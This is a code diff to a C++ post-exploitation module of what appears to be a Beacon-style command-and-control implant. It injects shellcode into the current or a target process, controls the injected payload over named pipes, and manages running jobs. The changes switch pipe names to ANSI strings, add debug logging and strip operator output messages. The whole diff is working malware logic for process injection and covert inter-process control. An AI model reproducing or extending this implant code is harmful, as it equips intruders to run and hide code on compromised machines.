@@ -76,7 +76,7 @@ typedef struct _POSTEX_OBJECT {
     ULONG  method;
     ULONG  state;
 
-    WCHAR  pipename[64];
+    CHAR   pipename[64];
     HANDLE pipe;
 
     HANDLE process_handle;
@@ -223,9 +223,9 @@ auto postex::memory_free(
         obj->remote_base = nullptr;
         obj->remote_size = 0;
         obj->need_free   = FALSE;
-
-        BeaconPrintf( CALLBACK_OUTPUT, "[postex-%llX] remote memory freed", obj->id );
     }
+
+    return ERROR_SUCCESS;
 }
 
 auto postex::cleanup( POSTEX_OBJECT* obj ) -> void {
@@ -257,7 +257,6 @@ auto postex::create(
     obj->state  = STATE_RUNNING;
     obj->id     = id;
 
-    // _swprintf( obj->pipename, L"%s_%llX", prefix_pipe, id);
     sprintf( (PCHAR)obj->pipename, "%s_%llX", prefix_pipe, id);
 
     return obj;
@@ -274,12 +273,14 @@ auto postex::pipe_connect(
     DWORD start = GetTickCount();
 
     while ( GetTickCount() - start < timeout_ms ) {
-        if ( WaitNamedPipeW(obj->pipename, 1000) ) {
-            obj->pipe = CreateFileW(
+        if ( WaitNamedPipeA(obj->pipename, 1000) ) {
+            obj->pipe = CreateFileA(
                 obj->pipename,
                 GENERIC_READ | GENERIC_WRITE,
                 0, nullptr, OPEN_EXISTING, 0, nullptr
             );
+
+            return TRUE;
         }
 
         WaitForSingleObject( nt_current_process(), 100 );
@@ -320,6 +321,8 @@ auto postex::pipe_read(
     DWORD bytes_read = 0;
     PBYTE buffer     = nullptr;
 
+    DbgPrint("[postex_poll] reading\n");
+
     if ( ! PeekNamedPipe( obj->pipe, nullptr, 0, nullptr, &available, nullptr ) ) {
         obj->failures++;
         if ( obj->failures >= POSTEX_MAX_FAILURES ) {
@@ -327,6 +330,8 @@ auto postex::pipe_read(
         }
         return;
     }
+
+    DbgPrint("[postex_poll] available bytes: %d\n", available);
 
     if ( available == 0 ) return;
 
@@ -336,6 +341,9 @@ auto postex::pipe_read(
     if ( ! ReadFile( obj->pipe, buffer, available, &bytes_read, nullptr ) || bytes_read == 0 ) {
         free( buffer ); obj->failures++; return;
     }
+
+    DbgPrint("[postex_poll] read: %d\n", bytes_read);
+    DbgPrint("[postex_poll] read: %s\n", buffer);
 
     obj->failures = 0;
 
@@ -355,7 +363,6 @@ auto postex::pipe_read(
             switch ( msg->type ) {
                 case MSG_READY:
                     obj->state = STATE_RUNNING;
-                    BeaconPrintf( CALLBACK_OUTPUT, "[postex-%llX] ready", obj->id );
                     break;
 
                 case MSG_OUTPUT:
@@ -372,7 +379,6 @@ auto postex::pipe_read(
                 case MSG_END:
                     obj->state = STATE_COMPLETED;
                     BeaconPkgInt32( msg->exit_code );
-                    BeaconPrintf( CALLBACK_OUTPUT, "[postex-%llX] completed (exit: %d, free: %s)", obj->id, msg->exit_code, msg->nfree ? "yes" : "no" );
                     break;
             }
 
@@ -381,15 +387,22 @@ auto postex::pipe_read(
         }
     }
 
-    BeaconOutput( CALLBACK_OUTPUT, (char*)buffer, bytes_read );
     free( buffer );
 }
 
 // ==================== POLL ====================
 
-auto postex::checkalive(
-    _In_ PPOSTEX_OBJECT obj
-) -> void {
+auto postex::checkalive( PPOSTEX_OBJECT obj ) -> void {
+    if ( obj->method == POSTEX_METHOD_INLINE ) {
+        if ( obj->thread_handle ) {
+            DWORD exit_code;
+            if ( GetExitCodeThread( obj->thread_handle, &exit_code ) && exit_code != STILL_ACTIVE ) {
+                obj->state = STATE_COMPLETED;
+            }
+        }
+        return;
+    }
+
     if ( obj->process_handle ) {
         DWORD exit_code;
         if ( GetExitCodeProcess( obj->process_handle, &exit_code ) && exit_code != STILL_ACTIVE ) {
@@ -414,7 +427,7 @@ auto postex::poll( void ) -> ULONG {
 
         if ( ! obj->connected ) {
             if ( postex::pipe_connect( obj, 500 ) ) {
-                BeaconPrintf(CALLBACK_OUTPUT, "[postex-%llX] connected", obj->id);
+                obj->connected = TRUE;
             }
         }
 
@@ -424,8 +437,7 @@ auto postex::poll( void ) -> ULONG {
 
         postex::checkalive( obj );
 
-        if ( obj->state == STATE_COMPLETED && obj->failures == POSTEX_MAX_FAILURES ) {
-            postex::pipe_read( obj );
+        if ( obj->state == STATE_COMPLETED || obj->failures == POSTEX_MAX_FAILURES ) {
             postex::destroy( obj );
         }
 
@@ -473,7 +485,14 @@ auto postex::inject_inline(
     _In_ INT32          size, 
     _In_ POSTEX_OBJECT* obj
 ) -> ERROR_CODE {
-    return ExplicitInjection( (INT64)nt_current_process(), FALSE, shellcode, size, nullptr, nullptr );
+    PROCESS_INFORMATION ps_info = {};
+
+    ERROR_CODE code = ExplicitInjection( (INT64)nt_current_process(), FALSE, shellcode, size, nullptr, &ps_info );
+
+    obj->thread_handle  = ps_info.hThread;
+    obj->process_handle = ps_info.hProcess;
+
+    return code;
 }
 
 typedef struct _POSTEX_HEADER {
@@ -482,7 +501,7 @@ typedef struct _POSTEX_HEADER {
     INT8   spoof;
     INT8   bypassflag;
     ULONG  pipename_len;
-    WCHAR* pipename;
+    CHAR*  pipename;
     ULONG  argc;
     PBYTE  args;
 } POSTEX_HEADER;
@@ -513,13 +532,12 @@ extern "C" auto go_inject( char* args, int argc ) -> BOOL {
 
     POSTEX_OBJECT* obj = postex::create( info.Config->Postex.ForkPipe, method, postex_id );
     if ( ! obj ) {
-        BeaconPrintf( CALLBACK_ERROR, "Failed to create postex object" );
         return FALSE;
     }
 
     // Calculate sizes dynamically
     // ULONG pipename_len = wcslen( info.Config->Postex.ForkPipe ) * sizeof(WCHAR);
-    ULONG pipename_len = strlen( (PCHAR)obj->pipename ) * sizeof(CHAR);
+    ULONG pipename_len = strlen( (PCHAR)obj->pipename ) * sizeof(CHAR) + 1;
     
     // Calculate header size based on struct layout
     ULONG header_size = offsetof(POSTEX_HEADER, pipename) +   // Fixed fields up to pipename
@@ -592,7 +610,7 @@ extern "C" auto go_inject( char* args, int argc ) -> BOOL {
             ok = postex::inject_explicit( pid, full_content, total_size, obj );
             break;
         default:
-            BeaconPrintf( CALLBACK_ERROR, "Unknown injection method: %d", method );
+            ok = 1;
             break;
     }
 
@@ -604,13 +622,9 @@ extern "C" auto go_inject( char* args, int argc ) -> BOOL {
     if ( ! ok ) {
         DbgPrint("success: %X\n", ok);
         postex::add( obj );
-        BeaconPrintf( CALLBACK_OUTPUT, "[postex-%llX] started (method=%d, pid=%d)", obj->id, method, pid );
-        BeaconPrintf( CALLBACK_OUTPUT, "\tpipe: %ls", obj->pipename );
     } else {
-        DbgPrint("failed: %X\n", ok);
         postex::cleanup( obj );
         free( obj );
-        BeaconPrintf( CALLBACK_ERROR, "Injection failed" );
     }
 
     return ok;
@@ -640,7 +654,6 @@ extern "C" void go_suspend( char* args, int argc ) {
 
     POSTEX_OBJECT* obj = postex::find( id );
     if ( ! obj ) {
-        BeaconPrintf( CALLBACK_ERROR, "postex %llX not found", id );
         return;
     }
 
@@ -660,7 +673,6 @@ extern "C" void go_resume(char* args, int argc) {
 
     POSTEX_OBJECT* obj = postex::find( id );
     if ( ! obj ) {
-        BeaconPrintf( CALLBACK_ERROR, "postex %llX not found", id );
         return;
     }
 
@@ -677,7 +689,6 @@ extern "C" void go_kill( char* args, int argc ) {
 
     POSTEX_OBJECT* obj = postex::find( id );
     if ( ! obj ) {
-        BeaconPrintf( CALLBACK_ERROR, "postex %llX not found", id );
         return;
     }
 
@@ -692,7 +703,6 @@ extern "C" void go_list( char* args, int argc ) {
     PPOSTEX_LIST list = postex::listget();
 
     if ( list->count == 0 ) {
-        BeaconPrintf( CALLBACK_OUTPUT, "no active postex" );
         return;
     }
 
